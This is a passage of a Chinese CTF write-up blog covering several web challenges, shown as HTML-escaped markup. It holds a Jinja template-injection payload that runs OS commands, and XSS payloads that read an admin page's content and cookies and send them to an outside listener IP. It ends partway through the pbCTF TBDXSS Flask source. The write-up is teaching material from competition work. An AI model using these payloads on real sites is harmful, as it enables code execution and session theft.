&lt;pre tabindex="0">&lt;code>{{&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;grep hxb2018{ /home/XmeO/*&amp;#34;).read()&amp;#39;)}}
&lt;/code>&lt;/pre>&lt;h3 id="非预期---xss">非预期 - xss&lt;/h3>
&lt;p>通过查看进程发现运行着&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220215203100071.png" alt="image-20220215203100071">&lt;/p>
&lt;p>在/static/assets/js/me.js中和上面0CTF那个题有一样的沙盒情况，响应头&lt;/p>
&lt;pre tabindex="0">&lt;code>script-src &amp;#39;self&amp;#39;
&lt;/code>&lt;/pre>&lt;p>说明不允许内联脚本执行，也就是直接嵌套在&lt;code>&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code>中的代码无法被执行，而&lt;code>&amp;lt;script src='url'&amp;gt;&amp;lt;/script&amp;gt;&lt;/code>中的代码将被执行，而且必须同源（很经典的绕过方式，也可换成iframe&lt;/p>
&lt;p>后台请求的url为&lt;code>http://127.0.0.1:7443/admin/&lt;/code>，提交xss payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">div&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">http://127.0.0.1:7443/show/591b111c-096d-11eb-97c4-0242ac110003&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">div&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>获取到hint&lt;/p>
&lt;pre tabindex="0">&lt;code>/?hint=Try%20to%20get%20admin&amp;#39;s%20page%20content
&lt;/code>&lt;/pre>&lt;p>由于页面的沙盒设置，我们利用上面的同款方式进行绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ifm&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;iframe&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">ifm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;src&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ifm&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">top&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">frames&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:7443/admin/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.0.134:8889/?c=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>会得到一个新的hint&lt;/p>
&lt;pre tabindex="0">&lt;code>/?c=%20%20%20%20This%20website%20also%20have%20another%20page%20named%20mysecrecy_directory......
&lt;/code>&lt;/pre>&lt;p>问题转变为获取&lt;code>/admin/mysecrecy_directory&lt;/code>下的cookie内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;iframe&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;src&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/mysecrecy_directory&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://192.168.0.134:8889/?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload只需要把之前的src改一下，在iframe加载的同时获取iframe中的cookie，并利用href跳转获取flag&lt;/p>
&lt;p>参考：&lt;a href="https://www.anquanke.com/post/id/220436">wp&lt;/a>&lt;/p>
&lt;h2 id="uiuctf-2021yana">[uiuCTF 2021]YANA&lt;/h2>
&lt;p>写过太多次了，不详细展开了；关于缓存投毒 + 子域名接管 + XS-Leaks ≈ 寄&lt;/p>
&lt;h2 id="pbctf-2021tbdxss">[pbCTF 2021]TBDXSS&lt;/h2>
&lt;p>&lt;del>救啊 又是xss&lt;/del> 给出了详细的源码，app.py+bot.js&lt;/p>
&lt;p>&lt;a href="https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss">https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html">https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS">https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">jsonify&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">redis&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;SECRET_KEY&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;tops3cr3t&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># session secret key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SESSION_COOKIE_SECURE&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SESSION_COOKIE_HTTPONLY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SESSION_COOKIE_SAMESITE&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Lax&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># samesite cookie lax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HOST&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;CHALL_HOST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost:5000&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">redis&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Redis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 后端redis数据库&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">after_request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add_XFrame&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Frame-Options&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;DENY&amp;#34;&lt;/span> &lt;span style="color:#75715e"># 该页面不允许被任何页面引用，也不允许引用任何页面&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">response&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/change_note&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># 修改session中的note&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;note&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modified&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Changed succesfully&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/do_report&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">do_report&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cur_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">time&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Forwarded-For&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&amp;#34;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strip&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># amazing google load balancer&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">last_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;time.&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 判断上报时间间隔&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">last_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">last_time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">last_time&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">time_diff&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur_time&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">last_time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">time_diff&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">rpush&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;submissions&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># 将上报url存入redis数据库中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">setex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;time.&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">ip&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cur_time&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;submitted&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;rate limited&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/note&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># note全部存session中 在本地&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">notes&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;note&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/report&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># 上报admin 转至/do_report&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;title&amp;gt;Notes app&amp;lt;/title&amp;gt;
